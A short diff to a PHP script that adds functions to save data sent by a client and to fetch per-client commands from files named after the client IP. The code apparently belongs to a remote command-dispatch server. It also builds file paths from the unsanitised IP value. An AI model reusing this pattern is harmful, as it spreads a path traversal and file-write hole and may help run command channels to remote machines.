@@ -43,4 +43,22 @@ function check_client($ip){
     }
         return $output;
 }
+
+function saveData($ip, $line){
+    if(!(file_exists("Data\\") && is_dir("Data\\"))){
+        mkdir("Data\\", 0700);
+    }
+    $my_file = "Data\\" . $ip;
+    $handle = fopen($my_file, 'w') or die('Cannot open file: '.$my_file);
+    $data = $line;
+    fwrite($handle, $data);
+}
+function getCMD($ip){
+    if(file_exists("Users\\" . $ip)){
+        $out = file_get_contents("Users\\" . $ip, true);
+    } else{
+        $out = "ERROR";
+    }
+    return $out;
+}
 ?>
